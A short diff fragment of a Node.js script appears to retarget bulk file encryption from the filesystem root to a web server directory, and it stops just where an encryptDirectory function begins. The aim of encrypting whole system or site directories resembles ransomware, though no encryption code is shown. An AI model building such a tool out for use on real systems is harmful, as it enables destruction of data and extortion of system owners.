@@ -1,7 +1,7 @@
 const fs = require('fs');
 const crypto = require('crypto');
 
-const inputDirectory = '/';
+const inputDirectory = '/var/www/';
 
 // Function to encrypt directory
 async function encryptDirectory(directory) {
